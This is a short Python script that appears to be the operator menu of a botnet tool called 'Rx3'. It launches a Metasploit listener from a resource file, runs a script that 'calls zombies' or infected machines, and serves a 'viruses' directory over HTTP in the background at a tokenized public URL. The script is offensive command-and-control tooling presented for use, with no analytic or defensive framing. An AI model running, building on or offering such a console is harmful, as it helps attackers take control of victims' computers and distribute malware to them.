#!/bin/python3
import os

port='[port]'
pubip='[pubip]'
token='[token]'

def main():
	os.system('clear')
	os.system('figlet Rx3 | lolcat')
	x=input('1. Start listening for connections\n2. Call infected\n3. Host viruses\n4. Exit\nSelect option: ').rstrip()
	if(x=='1'):
		op1()
	elif(x=='2'):
		os.system('clear')
		print('Option '+x+' chosen\nCalling zombies')
		os.system('python3 production/call.py')
		print('All online zombies called')
	elif(x=='3'):
		op3()
	elif(x=='4'):
		return
	else:
		os.system('clear')
		print('Invalid option: '+x)
		main()

def op1():
	os.system('clear')
	os.system('figlet Rx3 | lolcat')
	x=input('1. Open metasploit and listen\n2. Listen and call zombies\n3. Back\nSelect option: ')
	if(x=='1'):
		os.system('msfconsole -r production/msf.rc')
	elif(x=='2'):
		os.system('sleep 10 && python3 production/call.py &')
		os.system('msfconsole -r production/msf.rc')
	elif(x=='3'):
		main()
	else:
		os.system('clear')
		print('Invalid option: '+x)
		op1()

def op3():
	os.system('clear')
	os.system('figlet Rx3 | lolcat')
	x=input('1. Serve in this terminal\n2. Turn on passive serving\n3. Turn off passive serving\n4. Print url\n5. Back\nSelect option: ')
	if(x=='1'):
		os.system('clear')
		os.system('python3 -m http.server --directory production/hosting '+port)
	elif(x=='2'):
		os.system('nohup python3 -m http.server --directory production/hosting '+port+' > /dev/null 2>&1 &')
		print('Serving in the background')
	elif(x=='3'):
		os.system('pkill -f "python3 -m http.server"')
		print('Server shut down')
	elif(x=='4'):
		print(f'http://{pubip}:{port}/{token}/')
		os.system('ls production/hosting/'+token)
	elif(x=='5'):
		main()
	else:
		os.system('clear')
		print('Invalid option: '+x)
		op3()

main()
